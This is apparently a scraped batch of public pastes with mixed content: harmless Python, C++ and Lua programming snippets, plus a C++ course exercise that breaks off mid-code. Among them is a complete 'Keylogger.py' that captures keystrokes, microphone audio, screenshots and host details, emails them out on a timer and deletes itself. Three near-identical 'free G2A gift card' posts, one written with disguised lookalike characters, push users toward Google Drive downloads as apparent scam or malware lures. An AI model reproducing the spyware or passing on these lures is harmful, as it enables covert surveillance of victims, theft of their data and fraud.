id,title,username,language,date,content
sxxChGUa,ü§ë G2A.com Free Gift Card Guide Apr 2024 FIX ü§ë,ssss50w,GetText,Tuesday 23rd of April 2024 01:02:53 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
23 April 2024"
Dx3wMvAT,ü§ë G2A.com Free Gift Card Guide Apr 2024 FIX ü§ë,jordanthebordan,GetText,Tuesday 23rd of April 2024 12:25:19 PM CDT,"G2–ê.com fr–µe gift c–∞rd & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to d–∞te versi–æn of this scri—Ät. Any –æther one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1J2K7N8g5mZ_Zp-S0cjQrax7KrPk97EG3/view?usp=sharing
 
Working as of:
23 April 2024"
8ff4XQPS,ü§ë G2A.com Free Gift Card Guide Apr 2024 FIX ü§ë,jusst2k4,GetText,Tuesday 23rd of April 2024 12:04:47 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_750364.pdf

Working as of:
23 April 2024"
Gm8p8HHM,Keylogger.py,Dynamic_Fantasy,Python,Tuesday 23rd of April 2024 11:56:45 AM CDT,"try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = [""pyscreenshot"",""sounddevice"",""pynput""]
    call(""pip install "" + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = ""YOUR_USERNAME""
    EMAIL_PASSWORD = ""YOUR_PASSWORD""
    SEND_REPORT_EVERY = 60 # as in seconds
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = ""KeyLogger Started...""
            self.email = email
            self.password = password
        def appendlog(self, string):
            self.log = self.log + string
        def on_move(self, x, y):
            current_move = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_move)
        def on_click(self, x, y):
            current_click = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_click)
        def on_scroll(self, x, y):
            current_scroll = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_scroll)
        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = ""SPACE""
                elif key == key.esc:
                    current_key = ""ESC""
                else:
                    current_key = "" "" + str(key) + "" ""
            self.appendlog(current_key)
        def send_mail(self, email, password, message):
            sender = ""Private Person <from@example.com>""
            receiver = ""A Test User <to@example.com>""
            m = f""""""\
            Subject: main Mailtrap
            To: {receiver}
            From: {sender}
            \n""""""
            m += message
            with smtplib.SMTP(""smtp.mailtrap.io"", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, message)
        def report(self):
            self.send_mail(self.email, self.password, ""\n\n"" + self.log)
            self.log = """"
            timer = threading.Timer(self.interval, self.report)
            timer.start()
        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)
        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name == ""nt"":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system(""cd "" + pwd)
                    os.system(""TASKKILL /F /IM "" + os.path.basename(__file__))
                    print('File was closed.')
                    os.system(""DEL "" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')
            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system(""cd "" + pwd)
                    os.system('pkill leafpad')
                    os.system(""chattr -i "" +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system(""rm -rf"" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()"
8PUVb1uR,Combobox,plarmi,Python,Tuesday 23rd of April 2024 11:52:30 AM CDT,"import tkinter as tk
from tkinter import ttk

def change_color(event):
    # –ü–æ–ª—É—á–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –≤—ã–±—Ä–∞–ª –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å
    selected_color = color_combobox.get()
    canvas.config(bg=selected_color)

# –°–æ–∑–¥–∞–Ω–∏–µ –≥–ª–∞–≤–Ω–æ–≥–æ –æ–∫–Ω–∞
root = tk.Tk()
root.title(""–ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ü–≤–µ—Ç–∞ —Ö–æ–ª—Å—Ç–∞"")

# –°–æ–∑–¥–∞–Ω–∏–µ –≤—ã–ø–∞–¥–∞—é—â–µ–≥–æ —Å–ø–∏—Å–∫–∞ —Å —Ü–≤–µ—Ç–∞–º–∏
colors = [""red"", ""green"", ""blue"", ""yellow"", ""violet""]
color_combobox = ttk.Combobox(root, values=colors, state=""readonly"")
color_combobox.set(""red"")
# –ï—Å–ª–∏ –±—ã–ª–æ –Ω–∞–∂–∞—Ç–∏–µ –∏ —Å–¥–µ–ª–∞–Ω –≤—ã–±–æ—Ä, —Ç–æ –±—É–¥–µ—Ç –º–µ–Ω—è—Ç—å—Å—è —Ü–≤–µ—Ç
color_combobox.bind(""<<ComboboxSelected>>"", change_color)
color_combobox.pack(pady=20)

# –°–æ–∑–¥–∞–Ω–∏–µ —Ö–æ–ª—Å—Ç–∞
canvas = tk.Canvas(root, width=200, height=200, bg=""red"")
canvas.pack(pady=20)

# –ó–∞–ø—É—Å–∫ –≥–ª–∞–≤–Ω–æ–≥–æ —Ü–∏–∫–ª–∞
root.mainloop()"
sq13Adjs,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 11:41:10 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <ctime>
#include <cctype>

using namespace std;

class Shape {
    public:
        virtual double getArea() = 0;
};
class Square : public Shape {
    private:
        double a;
    public:
        Square(double a){
            this->a = a;
        }
        virtual double getArea(){
            return a*a;
        }
};
class Circle : public Shape {
    private:
        double r;
    public:
        Circle(double r){
            this->r = r;
        }
        virtual double getArea(){
            return 3.14159265358979323846*r*r;
        }
};

void doSomething(Shape &r){
    cout << ""We will compute the area"" << endl;
    cout << ""The area is "" << r.getArea() << endl;
}


int main(){

    cout << ""Let's compute area."" << endl;

    Shape *s = NULL;

    cout << ""1 for square, 0 for circle?"" << endl;
    int x;
    cin >> x;

    if(x == 1){
        cout << ""Great. Please enter edge length: "" << endl;
        double edge;
        cin >> edge;
        s = new Square(edge);
    } else if(x == 0){
        cout << ""Great. Please enter radius length: "" << endl;
        double radius;
        cin >> radius;
        s = new Circle(radius);
    }

    if(s != NULL){
        doSomething(*s);
        delete s;
    }

    cout << ""Good bye"" << endl;
    return 0;
}
"
rnHvfXHz,StargateDialing,PerryExtra,Lua,Tuesday 23rd of April 2024 11:41:07 AM CDT,"local arg = {...};
FAST_DIAL = false;

for _,v in pairs(arg) do
    if v == ""--fast"" then
        FAST_DIAL = true;
    elseif v then
        error(""Bad flag ["" .. v .. ""] failed to initialise"", 0);
    end
end

INTERFACE_TYPES = {
    ""basic_interface"",
    ""crystal_interface"",
    ""advanced_crystal_interface""
};
STARGATE_TYPES = {
    ""sgjourney:classic_stargate"",
    ""sgjourney:milky_way_stargate"",
    ""sgjourney:pegasus_stargate"",
    ""sgjourney:universe_stargate"",
    ""sgjourney:tollan_stargate""
};

--Find the proper interface--
INTERFACE_TYPE = INTERFACE_TYPES[1];
INTERFACE = peripheral.find(INTERFACE_TYPE);
if INTERFACE == null then
    INTERFACE_TYPE = INTERFACE_TYPES[2];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    INTERFACE_TYPE = INTERFACE_TYPES[3];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    INTERFACE_TYPE = nil;
end

--If an interface is found get the Stargate Type--
if INTERFACE_TYPE == nil then
    STARGATE_TYPE = nil;
else
    STARGATE_TYPE = INTERFACE.getStargateType();
end

print(""Interface Type : "" .. INTERFACE_TYPE);
print(""Stargate Type : "" .. STARGATE_TYPE);

--Check if selected stargate and flags can be used by current Interface--
if (FAST_DIAL == true or STARGATE_TYPE ~= STARGATE_TYPES[2]) and INTERFACE_TYPE == INTERFACE_TYPES[1] then
    error(""\"""" .. INTERFACE_TYPES[1] .. ""\"" can only be used with \"""" .. STARGATE_TYPES[2] ""\"" in default manual dial mode"", 0);
end

function dial(address)
    local addressLength = #address;
    
    if addressLength == 8 then
        INTERFACE.setChevronConfiguration({0, 1, 2, 3, 4, 6, 7, 8, 5});
    elseif addressLength == 9 then
        INTERFACE.setChevronConfiguration({0, 1, 2, 3, 4, 5, 6, 7, 8});
    end
   
    local start = INTERFACE.getChevronsEngaged() + 1;
   
    if STARGATE_TYPE == STARGATE_TYPES[2] and FAST_DIAL == false then
        for chevron = start,addressLength,1
        do
            local symbol = address[chevron];
        
            if chevron % 2 == 0 then
                INTERFACE.rotateClockwise(symbol);
            else
                INTERFACE.rotateAntiClockwise(symbol);
            end
        
            while(not INTERFACE.isCurrentSymbol(symbol))
            do
                sleep(0);
            end
		
            INTERFACE.endRotation();
        
            sleep(1);
            INTERFACE.openChevron();
		        
            sleep(0.5)
            if chevron < addressLength then
                INTERFACE.encodeChevron();
            end
		
            sleep(0.5);
            INTERFACE.closeChevron();
            sleep(1);
        end 
    else
        for chevron = start,addressLength,1
        do
            local symbol = address[chevron]
            
            interface.engageSymbol(symbol)
        end
    end
end

addresses = {
    {""Abydos"", {26, 6, 14, 31, 11, 29, 0}},
    {""Chulak"", {8, 1, 22, 14, 36, 19, 0}},
    {""Cavum Tenebrae"", {18, 7, 3, 36, 25, 15, 0}},
    {""Lantea"", {18, 20, 1, 15, 14, 7, 19, 0}},
    {""Nether"", {27, 23, 4, 34, 12, 28, 0}},
    {""End"", {13, 24, 2, 19, 3, 30, 0}},
    {""Aether"", {8, 7, 2, 17, 6, 21, 0}},
    {""Lost City"", {13, 4, 27, 8, 19, 3, 0}},
    {""ATM Mining"", {25, 33, 20, 7, 37, 17, 0}},
    {""ATM Other"", {12, 23, 36, 13, 21, 16, 0}},
    {""ATM Beyond"", {27, 5, 2, 23, 17, 38, 0}}
}

print(""Avaiting input:"")
for k,v in ipairs(addresses) do
    print(k .. "" : "" .. v[1])
end

input = tonumber(io.read())
sleep(0);

local addressLength = #addresses;
if input < 1 or input > addressLength then
    error(""Entered value is incorrect"", 0);
end
if #addresses[input][2] > 7 and INTERFACE_TYPE == INTERFACE_TYPES[1] then
    error(""Cannot dial 8 or 9 chevron address with \"""" .. INTERFACE_TYPES[1] .. ""\"" please upgrade to \"""" .. INTERFACE_TYPES[2] .. ""\"" or \"""" .. INTERFACE_TYPES[3] .. ""\"""");
end

dial(addresses[input][2]);"
mgjiVD7y,Untitled,biplovbhandari,Python,Tuesday 23rd of April 2024 11:39:45 AM CDT,"# Get relevant info from the JSON mixer file.
affine_transform = mixer[""projection""][""affine""][""doubleMatrix""]
patch_dims = mixer[""patchDimensions""]
patches_per_row = mixer[""patchesPerRow""]
total_patches = mixer[""totalPatches""]

# Path to your TFRecord file
tfrecord_file = '/content/drive/MyDrive/Colab Notebooks/DL_Book/Chapter_1/output/unet_v1/prediction/prediction_unet_v1.TFRecord'

# Define the feature description for deserialization
feature_description = {
    # Create a dictionary describing the features.
    'prediction': tf.io.FixedLenFeature([], tf.int64),
    'cropland_etc': tf.io.FixedLenFeature([], tf.float32),
    'rice': tf.io.FixedLenFeature([], tf.float32),
    'forest': tf.io.FixedLenFeature([], tf.float32),
    'urban': tf.io.FixedLenFeature([], tf.float32),
    'others_etc': tf.io.FixedLenFeature([], tf.float32),
}

def _parse_function(proto):
    return tf.io.parse_single_example(proto, feature_description)

# Create a dataset from the TFRecord file
raw_dataset = tf.data.TFRecordDataset(tfrecord_file)
parsed_dataset = raw_dataset.map(_parse_function)

from osgeo import gdal, osr
import cv2

# Initialize an empty array for the entire image
full_image = np.zeros((patch_dims[0] * (total_patches // patches_per_row),
                       patch_dims[1] * patches_per_row, 3), dtype=np.uint8)

# Iterate over each image in the parsed dataset
for i, features in enumerate(parsed_dataset):
    img = tf.image.decode_image(features['prediction']).numpy()
    row = i // patches_per_row
    col = i % patches_per_row
    full_image[row * patch_dims[0]:(row + 1) * patch_dims[0],
               col * patch_dims[1]:(col + 1) * patch_dims[1]] = img

# Create a GeoTIFF file
driver = gdal.GetDriverByName('GTiff')
outRaster = driver.Create('output.tif', full_image.shape[1], full_image.shape[0], 3, gdal.GDT_Byte)
outRaster.SetGeoTransform([affine_transform[2], affine_transform[0], 0,
                           affine_transform[5], 0, affine_transform[4]])

# Set the projection
outRasterSRS = osr.SpatialReference()
outRasterSRS.ImportFromEPSG(4326)
outRaster.SetProjection(outRasterSRS.ExportToWkt())

# Write the data
outband = outRaster.GetRasterBand(1)
outband.WriteArray(full_image[:,:,0])
outband = outRaster.GetRasterBand(2)
outband.WriteArray(full_image[:,:,1])
outband = outRaster.GetRasterBand(3)
outband.WriteArray(full_image[:,:,2])

# Flush data
outRaster.FlushCache()
"
yyN6fGjE,–°–ü–†–ò–ù–¢ ‚Ññ 7 | –ú–æ–¥–µ–ª—å –ø–∞–º—è—Ç–∏ –≤ C++ | –£—Ä–æ–∫ 10: –ü—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏–µ –æ–±—ä–µ–∫—Ç–æ–≤ 2/2,chevengur,C++,Tuesday 23rd of April 2024 11:21:47 AM CDT,"// –¢—É—Ç –º–æ–∂–Ω–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å scopedptr.h –∏ ptrvector.h, 
// –µ—Å–ª–∏ –æ–Ω–∏ –≤–∞–º –ø–æ–Ω–∞–¥–æ–±—è—Ç—Å—è.
#include <new> // –î–ª—è –∏—Å–∫–ª—é—á–µ–Ω–∏—è bad_alloc
#include <vector>
#include <cassert>
#include <algorithm>
#include <stdexcept>

using namespace std;
// –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —ç—Ç—É –∑–∞–≥–æ—Ç–æ–≤–∫—É PtrVector –∏–ª–∏ –∑–∞–º–µ–Ω–∏—Ç–µ –µ—ë –Ω–∞ —Å–≤–æ—é —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é
template <typename T>
class PtrVector {
public:
    PtrVector() = default;

    // –°–æ–∑–¥–∞—ë—Ç –≤–µ–∫—Ç–æ—Ä —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –Ω–∞ –∫–æ–ø–∏–∏ –æ–±—ä–µ–∫—Ç–æ–≤ –∏–∑ other
    PtrVector(const PtrVector& other) {
        // –†–µ–∑–µ—Ä–≤–∏—Ä—É–µ–º –º–µ—Å—Ç–æ –≤ vector-–µ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω—É–∂–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —ç–ª–µ–º–µ–Ω—Ç–æ–≤
        // –ë–ª–∞–≥–æ–¥–∞—Ä—è —ç—Ç–æ–º—É –ø—Ä–∏ push_back –Ω–µ –±—É–¥–µ—Ç –≤—ã–±—Ä–∞—Å—ã–≤–∞—Ç—å—Å—è –∏—Å–∫–ª—é—á–µ–Ω–∏–µ
        items_.reserve(other.items_.size());

        try {
            for (auto p : other.items_) {
                // –ö–æ–ø–∏—Ä—É–µ–º –æ–±—ä–µ–∫—Ç, –µ—Å–ª–∏ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –Ω–µ–≥–æ –Ω–µ–Ω—É–ª–µ–≤–æ–π
                auto p_copy = p ? new T(*p) : nullptr;  // new –º–æ–∂–µ—Ç –≤—ã–±—Ä–æ—Å–∏—Ç—å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ

                // –ù–µ –≤—ã–±—Ä–æ—Å–∏—Ç –∏—Å–∫–ª—é—á–µ–Ω–∏–µ, —Ç. –∫. –≤ vector –ø–∞–º—è—Ç—å —É–∂–µ –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–∞
                items_.push_back(p_copy);
            }
        }
        catch (...) {
            // —É–¥–∞–ª—è–µ–º —ç–ª–µ–º–µ–Ω—Ç—ã –≤ –≤–µ–∫—Ç–æ—Ä–µ –∏ –ø–µ—Ä–µ–≤—ã–±—Ä–∞—Å—ã–≤–∞–µ–º –ø–æ–π–º–∞–Ω–Ω–æ–µ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ
            DeleteItems();
            throw;
        }
    }

    // –î–µ—Å—Ç—Ä—É–∫—Ç–æ—Ä —É–¥–∞–ª—è–µ—Ç –æ–±—ä–µ–∫—Ç—ã –≤ –∫—É—á–µ, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–µ —Å—Å—ã–ª–∞—é—Ç—Å—è —É–∫–∞–∑–∞—Ç–µ–ª–∏,
    // –≤ –≤–µ–∫—Ç–æ—Ä–µ items_
    ~PtrVector() {
        DeleteItems();
    }

    PtrVector& operator=(const PtrVector& rhs)
    {
        if (this != &rhs)
        {
            auto rhs_copy(rhs);
            swap_(rhs_copy);

        }
        return *this;
    }

    void swap_(PtrVector& other) noexcept
    {
        swap(other.items_, this->items_);
    }


    // –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Å—ã–ª–∫—É –Ω–∞ –≤–µ–∫—Ç–æ—Ä —É–∫–∞–∑–∞—Ç–µ–ª–µ–π
    vector<T*>& GetItems() noexcept {
        return items_;
    }

    // –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∫–æ–Ω—Å—Ç–∞–Ω—Ç–Ω—É—é —Å—Å—ã–ª–∫—É –Ω–∞ –≤–µ–∫—Ç–æ—Ä —É–∫–∞–∑–∞—Ç–µ–ª–µ–π
    vector<T*> const& GetItems() const noexcept {
        return items_;
    }

private:
    void DeleteItems() noexcept {
        for (auto p : items_) {
            delete p;
        }
    }

    vector<T*> items_;
};

template <typename T>
class ScopedPtr {
public:
    ScopedPtr() = default;

    explicit ScopedPtr(T* raw_ptr) noexcept
        : ptr_(raw_ptr) {
    }

    // –ó–∞–ø—Ä–µ—â–∞–µ–º –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è
    ScopedPtr(const ScopedPtr&) = delete;

    ~ScopedPtr() {
        delete ptr_;
    }

    T* GetRawPtr() const noexcept {
        return ptr_;
    }

    T* Release() noexcept {
        T* p = ptr_;
        ptr_ = nullptr;
        return p;
    }

    explicit operator bool() const {
        return ptr_ != nullptr;
    }

    T* operator->() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return ptr_;
    }

    T& operator*() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return *ptr_;
    }

private:
    T* ptr_ = nullptr;
};

using namespace std;
// –©—É–ø–∞–ª—å—Ü–µ
class Tentacle {
public:
    explicit Tentacle(int id) noexcept
        : id_(id) {
    }

    int GetId() const noexcept {
        return id_;
    }

    Tentacle* GetLinkedTentacle() const noexcept {
        return linked_tentacle_;
    }
    void LinkTo(Tentacle& tentacle) noexcept {
        linked_tentacle_ = &tentacle;
    }
    void Unlink() noexcept {
        linked_tentacle_ = nullptr;
    }

private:
    int id_ = 0;
    Tentacle* linked_tentacle_ = nullptr;
};

// –û—Å—å–º–∏–Ω–æ–≥
class Octopus {
public:
    Octopus()
        : Octopus(8) {
    }

    explicit Octopus(int num_tentacles) {
        Tentacle* t = nullptr;
        try {
            for (int i = 1; i <= num_tentacles; ++i) {
                t = new Tentacle(i);      // –ú–æ–∂–µ—Ç –≤—ã–±—Ä–æ—Å–∏—Ç—å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ bad_alloc
                tentacles_.GetItems().push_back(t);  // –ú–æ–∂–µ—Ç –≤—ã–±—Ä–æ—Å–∏—Ç—å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ bad_alloc

                // –û–±–Ω—É–ª—è–µ–º —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —â—É–ø–∞–ª—å—Ü–µ, –∫–æ—Ç–æ—Ä–æ–µ —É–∂–µ –¥–æ–±–∞–≤–∏–ª–∏ –≤ tentacles_,
                // —á—Ç–æ–±—ã –Ω–µ —É–¥–∞–ª–∏—Ç—å –µ–≥–æ –≤ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–µ catch –ø–æ–≤—Ç–æ—Ä–Ω–æ
                t = nullptr;
            }
        }
        catch (const std::bad_alloc&) {
            // –£–¥–∞–ª—è–µ–º —â—É–ø–∞–ª—å—Ü–∞, –∫–æ—Ç–æ—Ä—ã–µ —É—Å–ø–µ–ª–∏ –ø–æ–ø–∞—Å—Ç—å –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä tentacles_
            Cleanup();
            // –£–¥–∞–ª—è–µ–º —â—É–ø–∞–ª—å—Ü–µ, –∫–æ—Ç–æ—Ä–æ–µ —Å–æ–∑–¥–∞–ª–∏, –Ω–æ –Ω–µ –¥–æ–±–∞–≤–∏–ª–∏ –≤ tentacles_
            delete t;
            // –ö–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä –Ω–µ —Å–º–æ–≥ —Å–æ–∑–¥–∞—Ç—å –æ—Å—å–º–∏–Ω–æ–≥–∞ —Å –≤–æ—Å–µ–º—å—é —â—É–ø–∞–ª—å—Ü–∞–º–∏,
            // –ø–æ—ç—Ç–æ–º—É –≤—ã–±—Ä–∞—Å—ã–≤–∞–µ–º –∏—Å–∫–ª—é—á–µ–Ω–∏–µ, —á—Ç–æ–±—ã —Å–æ–æ–±—â–∏—Ç—å –≤—ã–∑—ã–≤–∞—é—â–µ–º—É –∫–æ–¥—É –æ–± –æ—à–∏–±–∫–µ
            // throw –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –≤–Ω—É—Ç—Ä–∏ catch –≤—ã–ø–æ–ª–Ω—è–µ—Ç –ü–ï–†–ï–í–´–ë–†–û–° –ø–æ–π–º–∞–Ω–Ω–æ–≥–æ –∏—Å–∫–ª—é—á–µ–Ω–∏—è
            throw;
        }
    }

    ~Octopus() {
        // –û—Å—å–º–∏–Ω–æ–≥ –≤–ª–∞–¥–µ–µ—Ç –æ–±—ä–µ–∫—Ç–∞–º–∏ –≤ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–π –ø–∞–º—è—Ç–∏ (—â—É–ø–∞–ª—å—Ü–∞),
        // –∫–æ—Ç–æ—Ä—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —É–¥–∞–ª–µ–Ω—ã –ø—Ä–∏ –µ–≥–æ —Ä–∞–∑—Ä—É—à–µ–Ω–∏–∏.
        // –î–µ—Å—Ç—Ä—É–∫—Ç–æ—Ä - –ª—É—á—à–µ–µ –º–µ—Å—Ç–æ, —á—Ç–æ–±—ã –ø—Ä–∏–±—Ä–∞—Ç—å—Å—è –∑–∞ —Å–æ–±–æ–π.
        Cleanup();
    }

    // –î–æ–±–∞–≤–ª—è–µ—Ç –Ω–æ–≤–æ–µ —â—É–ø–∞–ª—å—Ü–µ —Å –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–º,
    // —Ä–∞–≤–Ω—ã–º (–∫–æ–ª–∏—á–µ—Å—Ç–≤–æ_—â—É–ø–∞–ª–µ—Ü + 1):
    // 1, 2, 3, ...
    // –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Å—ã–ª–∫—É –Ω–∞ –¥–æ–±–∞–≤–ª–µ–Ω–Ω–æ–µ —â—É–ø–∞–ª—å—Ü–µ
    Tentacle& AddTentacle() {
        ScopedPtr<Tentacle>tentacle(new Tentacle(GetTentacleCount() + 1));
        tentacles_.GetItems().push_back(tentacle.GetRawPtr());
        tentacle.Release();
        return *tentacles_.GetItems().back();
    }

    int GetTentacleCount() const noexcept {
        return static_cast<int>(tentacles_.GetItems().size());
    }

    const Tentacle& GetTentacle(size_t index) const {
        return *tentacles_.GetItems().at(index);
    }
    Tentacle& GetTentacle(size_t index) {
        return *tentacles_.GetItems().at(index);
    }

private:
    void Cleanup() {
        // –£–¥–∞–ª—è–µ–º —â—É–ø–∞–ª—å—Ü–∞ –æ—Å—å–º–∏–Ω–æ–≥–∞ –∏–∑ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–π –ø–∞–º—è—Ç–∏
        for (Tentacle* t : tentacles_.GetItems()) {
            delete t;
        }
        // –û—á–∏—â–∞–µ–º –º–∞—Å—Å–∏–≤ —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –Ω–∞ —â—É–ø–∞–ª—å—Ü–∞
        tentacles_.GetItems().clear();
    }

    // –í–µ–∫—Ç–æ—Ä —Ö—Ä–∞–Ω–∏—Ç —É–∫–∞–∑–∞—Ç–µ–ª–∏ –Ω–∞ —â—É–ø–∞–ª—å—Ü–∞. –°–∞–º–∏ –æ–±—ä–µ–∫—Ç—ã —â—É–ø–∞–ª–µ—Ü –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ –∫—É—á–µ

    PtrVector<Tentacle> tentacles_;
};

int main() {
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏—è –æ—Å—å–º–∏–Ω–æ–≥–æ–≤
    {
        Octopus octopus1(3);

        // –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –æ—Å—å–º–∏–Ω–æ–≥–∞
        octopus1.GetTentacle(2).LinkTo(octopus1.GetTentacle(1));

        // –î–æ –ø—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏—è octopus2 –∏–º–µ–µ—Ç —Å–≤–æ—ë —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ
        Octopus octopus2(10);

        octopus2 = octopus1;

        // –ü–æ—Å–ª–µ –ø—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏—è –æ—Å—å–º–∏–Ω–æ–≥–æ–≤ —â—É–ø–∞–ª—å—Ü–∞ –∫–æ–ø–∏–∏ –∏–º–µ—é—Ç —Ç–æ –∂–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ,
        // —á—Ç–æ –∏ —â—É–ø–∞–ª—å—Ü–∞ –ø—Ä–∏—Å–≤–∞–∏–≤–∞–µ–º–æ–≥–æ –æ–±—ä–µ–∫—Ç–∞
        assert(octopus2.GetTentacleCount() == octopus1.GetTentacleCount());
        for (int i = 0; i < octopus2.GetTentacleCount(); ++i) {
            auto& tentacle1 = octopus1.GetTentacle(i);
            auto& tentacle2 = octopus2.GetTentacle(i);
            assert(&tentacle2 != &tentacle1);
            assert(tentacle2.GetId() == tentacle1.GetId());
            assert(tentacle2.GetLinkedTentacle() == tentacle1.GetLinkedTentacle());
        }
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∞–º–æ–ø—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏—è –æ—Å—å–º–∏–Ω–æ–≥–æ–≤
    {
        Octopus octopus(3);

        // –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –æ—Å—å–º–∏–Ω–æ–≥–∞
        octopus.GetTentacle(0).LinkTo(octopus.GetTentacle(1));

        vector<pair<Tentacle*, Tentacle*>> tentacles;
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —â—É–ø–∞–ª—å—Ü–∞—Ö –æ—Å—å–º–∏–Ω–æ–≥–∞ –∏ –µ–≥–æ –∫–æ–ø–∏–∏
        for (int i = 0; i < octopus.GetTentacleCount(); ++i) {
            tentacles.push_back({ &octopus.GetTentacle(i), octopus.GetTentacle(i).GetLinkedTentacle() });
        }

